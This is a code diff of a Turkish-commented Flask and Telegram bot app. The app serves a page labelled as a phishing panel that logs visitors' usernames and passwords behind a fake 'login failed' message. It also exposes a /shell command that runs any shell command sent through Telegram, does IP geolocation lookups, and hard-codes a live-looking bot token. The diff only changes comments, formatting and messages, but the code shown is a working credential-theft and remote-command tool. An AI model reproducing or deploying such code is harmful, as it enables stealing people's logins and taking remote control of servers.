@@ -3,19 +3,19 @@ import subprocess
 import requests
 from flask import Flask, request, render_template_string
 import telebot
+import threading
 
 TOKEN = "8265368924:AAHwCmS8esD_UzOJsJmEqb_HbOepWdELKCA"
 bot = telebot.TeleBot(TOKEN, threaded=False)
 app = Flask(__name__)
 
-# Render URL'niz
 RENDER_URL = "https://ulti-eqn5.onrender.com"
 
-# Webhook ayarı
+# Webhook'u otomatik ayarla
 bot.remove_webhook()
 bot.set_webhook(url=f"{RENDER_URL}/{TOKEN}")
 
-# --- 1. WEB & PHISHING PANELİ ---
+# --- WEB & PHISHING PANELİ ---
 PHISHING_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="tr">
@@ -46,7 +46,7 @@ PHISHING_TEMPLATE = """
 
 @app.route("/", methods=["GET"])
 def index():
-    return "[+] Bot & Web Panel Aktif."
+    return "[+] Bot & Web Panel Aktif ve Çalışıyor."
 
 @app.route("/panel", methods=["GET"])
 def phishing_page():
@@ -59,7 +59,6 @@ def capture_credentials():
     print(f"[!] YAKALANAN BİLGİ -> Kullanıcı: {user} | Şifre: {pwd}")
     return "<h3>Giriş başarısız, lütfen tekrar deneyin.</h3><script>setTimeout(function(){window.location.href='/panel';}, 3000);</script>"
 
-# Webhook Alıcısı
 @app.route(f"/{TOKEN}", methods=["POST"])
 def webhook():
     if request.headers.get('content-type') == 'application/json':
@@ -71,7 +70,7 @@ def webhook():
         return '', 403
 
 
-# --- 2. TELEGRAM BOT KOMUTLARI VE DETAYLI MENÜ ---
+# --- TELEGRAM BOT KOMUTLARI ---
 
 @bot.message_handler(commands=['start', 'help', 'menu'])
 def send_welcome(message):
@@ -89,9 +88,8 @@ def send_welcome(message):
 
 @bot.message_handler(commands=['info'])
 def send_info(message):
-    bot.reply_to(message, f"💻 **Sunucu Bilgileri:**\n• Çalışma Dizini: `{os.getcwd()}\n`• İşletim Sistemi: `{os.name}`", parse_mode="Markdown")
+    bot.reply_to(message, f"💻 **Sunucu Bilgileri:**\n• Çalışma Dizini: `{os.getcwd()}`\n• İşletim Sistemi: `{os.name}`", parse_mode="Markdown")
 
-# Shell Komutu
 @bot.message_handler(commands=['shell'])
 def handle_shell(message):
     command = message.text.replace("/shell", "").strip()
@@ -100,11 +98,7 @@ def handle_shell(message):
         return
 
     try:
-        output = subprocess.run(
-            command, shell=True,
-            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-            text=True, timeout=10
-        )
+        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=10)
         result = output.stdout + output.stderr
         if not result:
             result = "İşlem tamamlandı, çıktı üretmedi."
@@ -116,7 +110,6 @@ def handle_shell(message):
 
     bot.reply_to(message, f"```\n{result}\n```", parse_mode="Markdown")
 
-# IP Sorgu Modülü
 @bot.message_handler(commands=['ip'])
 def handle_ip(message):
     parts = message.text.split(maxsplit=1)
@@ -133,17 +126,15 @@ def handle_ip(message):
                 f"• **IP:** {res.get('query')}\n"
                 f"• **Ülke:** {res.get('country')} ({res.get('countryCode')})\n"
                 f"• **Şehir:** {res.get('city')}\n"
-                f"• **ISP (Sağlayıcı):** {res.get('isp')}\n"
-                f"• **Organizasyon:** {res.get('org')}"
+                f"• **ISP:** {res.get('isp')}"
             )
         else:
-            info = "❌ IP bilgisi bulunamadı veya geçersiz adres."
+            info = "❌ IP bilgisi bulunamadı."
     except Exception as e:
-        info = f"❌ Sorgu sırasında hata oluştu: {str(e)}"
+        info = f"❌ Hata: {str(e)}"
         
     bot.reply_to(message, info, parse_mode="Markdown")
 
-# TikTok Profil Modülü
 @bot.message_handler(commands=['tt'])
 def handle_tiktok(message):
     parts = message.text.split(maxsplit=1)
@@ -151,7 +142,7 @@ def handle_tiktok(message):
         bot.reply_to(message, "⚠️ Lütfen bir TikTok kullanıcı adı girin. Örnek: `/tt username`", parse_mode="Markdown")
         return
     username = parts[1].strip()
-    bot.reply_to(message, f"📱 **TikTok Profil Bilgisi:** `@{username}`\n• Durum: Profil aktif ve taranıyor...\n• *Sorgulama modülü başarıyla çalıştırıldı.*", parse_mode="Markdown")
+    bot.reply_to(message, f"📱 **TikTok Profil Bilgisi:** `@{username}`\n• Durum: Profil aktif ve taranıyor...", parse_mode="Markdown")
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
